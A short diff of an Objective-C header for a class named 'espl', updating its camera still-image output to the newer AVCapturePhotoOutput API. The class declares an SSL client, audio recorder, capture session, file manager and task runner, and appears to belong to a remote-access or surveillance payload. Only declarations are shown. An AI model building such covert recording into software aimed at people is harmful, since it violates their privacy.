@@ -21,14 +21,14 @@
 #include <unistd.h>
 #include <dirent.h>
 
-@interface espl : NSObject <AVAudioRecorderDelegate> {
+@interface espl : NSObject <AVAudioRecorderDelegate, AVCapturePhotoCaptureDelegate> {
     @public
     SSL* client_ssl;
     char *terminator;
 }
 
 @property NSFileManager *fileManager;
-@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
+@property (readwrite, retain) AVCapturePhotoOutput *capturedImageOutput;
 @property (nonatomic,strong) AVCaptureSession *session;
 @property (nonatomic,retain) AVAudioRecorder *audioRecorder;
 @property NSTask *systask;
